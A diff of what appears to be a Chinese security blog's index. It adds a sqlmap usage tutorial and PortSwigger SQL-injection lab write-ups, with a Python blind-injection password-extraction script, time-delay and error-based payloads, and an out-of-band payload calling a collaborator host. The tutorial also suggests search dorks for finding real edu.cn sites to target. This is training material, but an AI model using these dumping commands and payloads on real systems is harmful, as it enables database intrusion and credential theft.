@@ -353,6 +353,153 @@ $$</p>
       </categories>
   </entry>
   <entry>
+    <title>【安全工具】sqlmap</title>
+    <url>/posts/23b5c41a/</url>
+    <content><![CDATA[<h2 id="所有命令">所有命令</h2>
+<p><img src="/posts/23b5c41a//image-20250316160541099.png" alt="image-20250316160541099"></p>
+<p>SQLmap是一款「自动化」<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&amp;spm=1001.2101.3001.7020">SQL注入</a>工具，kali自带。路径 /usr/share/sqlmap</p>
+<p>打开终端，输入<code>sqlmap</code>，出现以下界面，就说明SQLmap「可用」。</p>
+<p><img src="/posts/23b5c41a//3323630f970599810ae0f763b683dfe5.png" alt="在这里插入图片描述"></p>
+<p>本篇文章使用本地搭建的SQL-labs靶场作为「演示」目标，其他目标可使用必应搜索以下类型的网站：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">inurl:news.asp?<span class="built_in">id</span>=site:edu.cn</span><br><span class="line">inurl:news.php?<span class="built_in">id</span>= site:edu.cn</span><br><span class="line">inurl:news.aspx?<span class="built_in">id</span>=site:edu.cn</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/23b5c41a//f8c3e9690521f33f60d6a89532b65714.png" alt="在这里插入图片描述"></p>
+<h2 id="快速入门">快速入门</h2>
+<p><strong>SQLmap（常规）使用步骤</strong></p>
+<p>1、检测「注入点」</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>2、查看所有「数据库」</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --dbs</span><br></pre></td></tr></table></figure>
+<p>3、查看当前使用的数据库</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --current-db</span><br></pre></td></tr></table></figure>
+<p>4、查看「数据表」</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
+<p>5、查看「字段」</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
+<p>6、查看「数据」</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --dump</span><br></pre></td></tr></table></figure>
+<h2 id="检测目标">检测目标</h2>
+<p>检测「注入点」前，需要指定需要检测的「对象」。</p>
+<h3 id="指定url">指定url</h3>
+<p><code>-u</code> 参数，指定需要检测的url，单/双引号包裹。中间如果有提示，就输入y。</p>
+<p>提示：SQLmap不能直接「扫描」网站漏洞，先用其他扫描工具扫出注入点，再用SQLmap验证并「利用」注入点。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27;</span><br></pre></td></tr></table></figure>
+<p>扫描完成后，告诉我们存在的注入类型和使用的数据库及版本。</p>
+<p><img src="/posts/23b5c41a//image-20250316162233436.png" alt="image-20250316162233436"></p>
+<h3 id="指定文件（批量检测）">指定文件（批量检测）</h3>
+<p>准备一个「文件」，写上需要检测的多个url，一行一个。</p>
+<p><code>-m</code> 指定文件，可以「批量扫描」文件中的url，需要确认就按y。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -m urls.txt</span><br></pre></td></tr></table></figure>
+<h3 id="指定数据库-表-字段">指定数据库/表/字段</h3>
+<p><code>-D</code> 指定目标「数据库」，单/双引号包裹，常配合其他参数使用。</p>
+<p><code>-T</code> 指定目标「表」，单/双引号包裹，常配合其他参数使用。</p>
+<p><code>-C</code> 指定目标「字段」，单/双引号包裹，常配合其他参数使用。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> -C <span class="string">&#x27;username&#x27;</span> --dump</span><br></pre></td></tr></table></figure>
+<h3 id="post请求">post请求</h3>
+<p>检测「post请求」的注入点，使用BP等工具「抓包」，将http请求内容保存到txt文件中。</p>
+<p><code>-r</code> 指定需要检测的文件，SQLmap会通过post请求方式检测目标。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r bp.txt</span><br></pre></td></tr></table></figure>
+<h3 id="cookie注入">cookie注入</h3>
+<p><code>--cookie</code> 指定cookie的值，单/双引号包裹。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://xx?id=x&quot;</span> --cookie <span class="string">&#x27;cookie&#x27;</span></span><br></pre></td></tr></table></figure>
+<h3 id="WAF绕过">WAF绕过</h3>
+<p><code>--tamper</code> 指定绕过脚本，绕过WAF或ids等。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --tamper <span class="string">&#x27;space2comment.py&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>SQLmap内置了很多绕过脚本，在 /usr/share/sqlmap/tamper/ 目录下：</p>
+<p><img src="/posts/23b5c41a//image-20250316163642927.png" alt="image-20250316163642927"></p>
+<p>脚本按照用途命名，比如 <a href="http://space2comment.py">space2comment.py</a> 是指，用/**/代替空格。</p>
+<p>当然，你也可以根据内置脚本格式，自己定义绕过脚本。</p>
+<h3 id="其他">其他</h3>
+<p><code>--batch</code> （默认确认）不再询问是否确认。</p>
+<p><code>--level 1</code> 执行测试的等级（1-5，默认为1，常用3）</p>
+<p><code>--method=GET</code> 指定请求方式（GET/POST）</p>
+<p><code>--random-agent</code> 随机切换UA（User-Agent）</p>
+<p><code>--user-agent ' '</code> 使用自定义的UA（User-Agent）</p>
+<p><code>--referer ' '</code> 使用自定义的 referer</p>
+<p><code>--proxy=&quot;127.0.0.1:8080&quot;</code> 指定代理</p>
+<p><code>--threads 10</code> 设置线程数，最高10</p>
+<p><code>--risk=1</code> 风险级别（0~3，默认1，常用1），级别提高会增加数据被篡改的风险。</p>
+<p><code>--level 1</code> 执行测试的等级（1-5，默认为1，常用3）</p>
+<h2 id="脱库">脱库</h2>
+<p>获取所有内容</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27; -a</span><br></pre></td></tr></table></figure>
+<p><code>-a</code> 就是 all 的意思，获取所有能获取的内容，会消耗很长时间。</p>
+<h3 id="获取数据库">获取数据库</h3>
+<p><code>--dbs</code> 获取数据库</p>
+<p><strong>1、获取数据库版本</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27; -b</span><br></pre></td></tr></table></figure>
+<p><strong>2、获取当前使用的数据库</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27; --current-db</span><br></pre></td></tr></table></figure>
+<p><strong>3、获取所有数据库</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --dbs</span><br></pre></td></tr></table></figure>
+<h3 id="获取表">获取表</h3>
+<p><code>--tables</code> 获取表</p>
+<p><strong>1、获取表，可以指定数据库</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
+<p><strong>2、同时获取多个库的表名，库名用逗号分隔。</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security,sys&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
+<p><strong>3、不指定数据库，默认获取每个数据库中所有的表。</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
+<h3 id="获取字段">获取字段</h3>
+<p><code>--columns</code> 参数用来获取字段。</p>
+<p><strong>1、获取字段，可以指定库和表</strong></p>
+<p>提示：只指定库名但不指定表名会报错。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --columns</span><br></pre></td></tr></table></figure>
+<p><strong>2、不指定表名，默认获取当前数据库中所有表的字段。</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --columns</span><br></pre></td></tr></table></figure>
+<h3 id="获取字段类型">获取字段类型</h3>
+<p><code>--schema</code> 获取字段类型，可以指定库或指定表。不指定则获取数据库中每个表所有字段的类型。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --schema</span><br></pre></td></tr></table></figure>
+<h3 id="获取值（数据）">获取值（数据）</h3>
+<p><code>--dump</code> 获取值，也就是表中的数据。可以指定具体的库、表、字段。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> -C <span class="string">&#x27;username,password&#x27;</span> --dump</span><br></pre></td></tr></table></figure>
+<p>获取指定库中所有表的数据。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --dump</span><br></pre></td></tr></table></figure>
+<p>默认获取表中的所有数据，可以使用 <code>--start</code> <code>--stop</code> 指定开始和结束的行，只获取一部分数据。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --start 1 --stop 5  --dump</span><br></pre></td></tr></table></figure>
+<h3 id="获取用户">获取用户</h3>
+<p><strong>1、获取当前登录数据库的用户</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://192.168.31.180/sqli-labs-master/Less-1/?id=1&#x27; --current-user</span><br></pre></td></tr></table></figure>
+<p><strong>2、获取所有用户</strong></p>
+<p><code>--users</code> 获取数据库的所有用户名。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --<span class="built_in">users</span></span><br></pre></td></tr></table></figure>
+<p><strong>3、获取用户密码</strong></p>
+<p><code>--passwords</code> 获取所有数据库用户的密码（哈希值）。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --passwords</span><br></pre></td></tr></table></figure>
+<p>数据库不存储明文密码，只会将密码加密后，存储密码的哈希值，所以这里只能查出来哈希值；当然，你也可以借助工具把它们解析成明文。最后面显示数据库用户名对应的密码的哈希值。</p>
+<p><strong>6.4、获取用户权限</strong></p>
+<p><code>--privileges</code> 查看每个数据库用户都有哪些权限。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --privileges</span><br></pre></td></tr></table></figure>
+<p><strong>6.5、判断当前用户是不是管理员</strong></p>
+<p><code>--is-dba</code> 判断当前登录的用户是不是数据库的管理员账号。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --is-dba</span><br></pre></td></tr></table></figure>
+<p>如果是管理员，就在最后面显示 true。</p>
+<h3 id="获取主机名">获取主机名</h3>
+<p><code>--hostname</code> 获取服务器主机名。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --hostname</span><br></pre></td></tr></table></figure>
+<h3 id="搜索库、表、字段。">搜索库、表、字段。</h3>
+<p><code>--search</code> 搜索数据库中是否存在指定库/表/字段，需要指定库名/表名/字段名。</p>
+<p>搜索数据库中有没有 security 这个数据库：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --search</span><br></pre></td></tr></table></figure>
+<p>需要手动选择模糊匹配（1）还是完全匹配（2），而后返回匹配的结果。</p>
+<p><img src="/posts/23b5c41a//image-20250316163205508.png" alt="image-20250316163205508"></p>
+<p>也可以搜索表</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xxx/?id=1&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --search</span><br></pre></td></tr></table></figure>
+<p>或者搜索字段</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -C <span class="string">&#x27;username&#x27;</span> --search</span><br></pre></td></tr></table></figure>
+<h3 id="正在执行的SQL语句">正在执行的SQL语句</h3>
+<p><code>--statements</code> 获取数据库中正在执行的SQL语句。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --statements </span><br></pre></td></tr></table></figure>
+<p>本文参考：</p>
+<p><a href="https://blog.csdn.net/wangyuxiang946/article/details/131236510">SQLmap使用教程图文教程（超详细）</a></p>
+]]></content>
+      <categories>
+        <category>安全工具</category>
+      </categories>
+      <tags>
+        <tag>sqlmap</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【PortSwigger靶场】SQL injection</title>
     <url>/posts/3b7c6011/</url>
     <content><![CDATA[<h2 id="SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data">SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h2>
@@ -465,6 +612,29 @@ $$</p>
 <p>在获得某用户密码的时候，本题只需要我们获得<code>administrator</code>的密码就可以了，考虑到密码又多又长，逐个爆破会消耗大量的时间，因此我编写了Python脚本单独对<code>administrator</code>用户进行爆破，脚本已经很自动化了，只需要把url和TrackingId换成子自己的就可以了。脚本如下：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求的URL</span></span><br><span class="line">url = <span class="string">&quot;https://0a00000a04a6557481de208a005400a1.web-security-academy.net/filter?category=Pets&quot;</span></span><br><span class="line">username = <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">tablename = <span class="string">&#x27;users&#x27;</span></span><br><span class="line">method = <span class="string">&#x27;get&#x27;</span></span><br><span class="line">sleep_time = <span class="number">0</span></span><br><span class="line">TrackingId = <span class="string">&#x27;brVO8ubeFsIHT9hw&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cookie获取密码长度get_password_length_by_user</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password_length_by_user</span>(<span class="params">url,username,tablename,intject_id</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        cookies = &#123;</span><br><span class="line">            <span class="string">&#x27;TrackingId&#x27;</span>: <span class="string">f&quot;<span class="subst">&#123;intject_id&#125;</span>&#x27; and (select &#x27;a&#x27; from users where username=&#x27;<span class="subst">&#123;username&#125;</span>&#x27; AND LENGTH(password)&gt;<span class="subst">&#123;i&#125;</span>)=&#x27;a&#x27; --+&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.request(url=url,method=method,cookies=cookies)</span><br><span class="line">        sleep(sleep_time)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Welcome back!&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            password_length=i</span><br><span class="line">            <span class="keyword">return</span> password_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#爆破某一用户名密码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password_by_user</span>(<span class="params">url,username,tablename,inject_id</span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    password_length=get_password_length_by_user(url,username,tablename,inject_id)</span><br><span class="line">    <span class="keyword">for</span> password_index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, password_length+<span class="number">1</span>):</span><br><span class="line">        ascii_low = <span class="number">32</span></span><br><span class="line">        ascii_high = <span class="number">128</span></span><br><span class="line">        ascii_mid=(ascii_low+ascii_high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> ascii_low &lt; ascii_high:</span><br><span class="line">            cookies = &#123;</span><br><span class="line">                <span class="string">&#x27;TrackingId&#x27;</span>: <span class="string">f&quot;<span class="subst">&#123;inject_id&#125;</span>&#x27; and ascii(substr((select password from <span class="subst">&#123;tablename&#125;</span> where username=&#x27;<span class="subst">&#123;username&#125;</span>&#x27;),<span class="subst">&#123;password_index&#125;</span>,1)) &gt; <span class="subst">&#123;ascii_mid&#125;</span>--+;&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            response = requests.request(url=url,method=method,cookies=cookies)</span><br><span class="line">            sleep(sleep_time)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Welcome back!&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                ascii_low=ascii_mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ascii_high = ascii_mid</span><br><span class="line">            ascii_mid=(ascii_low+ascii_high)//<span class="number">2</span></span><br><span class="line">        result+=<span class="built_in">chr</span>(ascii_mid)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">password=get_password_by_user( url,username,tablename,TrackingId)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>
 <p><font class="notice">其实，本题在爆破数据表时，也可以使用Python单独对表名中含有<code>user</code>的表进行爆破，但考虑实际情况，把所有的表名爆破出，容易获得更多的信息</font></p>
+<h2 id="Blind-SQL-injection-with-conditional-errors">Blind SQL injection with conditional errors</h2>
+<p>跟上一题是非常类似的。讲一下原理</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、添加单引号收到错误</span><br><span class="line">TrackingId<span class="operator">=</span>xyz<span class="string">&#x27;</span></span><br><span class="line"><span class="string">2、添加两个单引号错误消失</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;&#x27;</span></span><br><span class="line"><span class="string">3、确认是查询错误而不是其他类型错误。下列语句表明目标为Oracle 数据库</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;（错误）</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">FROM</span> dual)<span class="operator">||</span><span class="string">&#x27;（正确）</span></span><br><span class="line"><span class="string">4、验证users表存在</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> ROWNUM <span class="operator">=</span> <span class="number">1</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">5、验证用户administrator存在</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">1</span><span class="operator">=</span><span class="number">1</span>) <span class="keyword">THEN</span> TO_CHAR(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">6、爆破密码长度</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> LENGTH(password)<span class="operator">&gt;</span>§a§ <span class="keyword">THEN</span> to_char(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">7、爆破密码</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> SUBSTR(password,§b§,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;§a§&#x27;</span> <span class="keyword">THEN</span> TO_CHAR(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>结果如下：</p>
+<p><img src="/posts/3b7c6011//image-20250316173050195.png" alt="image-20250316173050195"></p>
+<h2 id="Visible-error-based-SQL-injection">Visible error-based SQL injection</h2>
+<p>错误会返回到客户端</p>
+<p><img src="/posts/3b7c6011//image-20250316181656140.png" alt="image-20250316181656140"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、天加一个引号，可以在web页面看到报错，并看到自己的cookie</span><br><span class="line">TrackingId<span class="operator">=</span>xxx<span class="string">&#x27;</span></span><br><span class="line"><span class="string">2、添加注释符不再报错</span></span><br><span class="line"><span class="string">TrackingId=xxx&#x27;</span><span class="comment">--</span></span><br><span class="line"><span class="number">3</span>、添加错误的语句观察返回内容</span><br><span class="line">TrackingId<span class="operator">=</span>xxx<span class="string">&#x27; AND CAST((SELECT 1) AS int)--</span></span><br><span class="line"><span class="string">4、使用正确语句错误消失</span></span><br><span class="line"><span class="string">TrackingId=xxx&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> <span class="number">1</span>) <span class="keyword">AS</span> <span class="type">int</span>)<span class="comment">--</span></span><br><span class="line"><span class="number">5</span>、泄露用户</span><br><span class="line">TrackingId<span class="operator">=</span>xxxx<span class="string">&#x27; AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--</span></span><br><span class="line"><span class="string">6、泄露密码</span></span><br><span class="line"><span class="string">TrackingId=&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="keyword">AS</span> <span class="type">int</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>我试了下面这个注入语句，但是没有得到想要的结果。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span><span class="string">&#x27; AND 1=CAST((SELECT password FROM users where username=&#x27;</span>administrator<span class="string">&#x27;) AS int)--</span></span><br></pre></td></tr></table></figure>
+<p><img src="/posts/3b7c6011//image-20250316184013533.png" alt="image-20250316184013533"></p>
+<h2 id="Blind-SQL-injection-with-time-delays-and-information-retrieval">Blind SQL injection with time delays and information retrieval</h2>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>延迟<span class="number">10</span>秒</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</span></span><br><span class="line"><span class="string">2.不延时</span></span><br><span class="line"><span class="string">TrackingId=x&#x27;</span><span class="operator">%</span><span class="number">3</span>BSELECT<span class="operator">+</span><span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>pg_sleep(<span class="number">10</span>)<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>pg_sleep(<span class="number">0</span>)<span class="operator">+</span><span class="keyword">END</span><span class="comment">--</span></span><br><span class="line"><span class="number">3.</span>延时，说明有administrator用户</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(username=&#x27;</span>administrator<span class="string">&#x27;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></span><br><span class="line"><span class="string">4.延时，说明密码长度为20</span></span><br><span class="line"><span class="string">TrackingId=x&#x27;</span><span class="operator">%</span><span class="number">3</span>BSELECT<span class="operator">+</span><span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span><span class="operator">+</span><span class="keyword">AND</span><span class="operator">+</span>LENGTH(password)<span class="operator">=</span><span class="number">20</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>pg_sleep(<span class="number">10</span>)<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>pg_sleep(<span class="number">0</span>)<span class="operator">+</span><span class="keyword">END</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>users<span class="comment">--</span></span><br><span class="line"><span class="number">5.</span>bp爆破</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(username=&#x27;</span>administrator<span class="string">&#x27;+AND+SUBSTRING(password,§b§,1)=&#x27;</span>§a§<span class="string">&#x27;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></span><br></pre></td></tr></table></figure>
+<h2 id="Blind-SQL-injection-with-out-of-band-interaction">Blind SQL injection with out-of-band interaction</h2>
+<p><img src="/posts/3b7c6011//image-20250320124609391.png" alt="image-20250320124609391"></p>
+<p><a href="http://k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com">k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com</a></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie: TrackingId<span class="operator">=</span>Mf3GZbtHdrUPYCyR<span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--; session=7HQmzle2kv8m9yAyiZADwZ8B64e6hGQp</span></span><br></pre></td></tr></table></figure>
+<p><img src="/posts/3b7c6011//image-20250320124746996.png" alt="image-20250320124746996"></p>
+<h2 id="Blind-SQL-injection-with-out-of-band-data-exfiltration">Blind SQL injection with out-of-band data exfiltration</h2>
+<p>跟上边类似的</p>
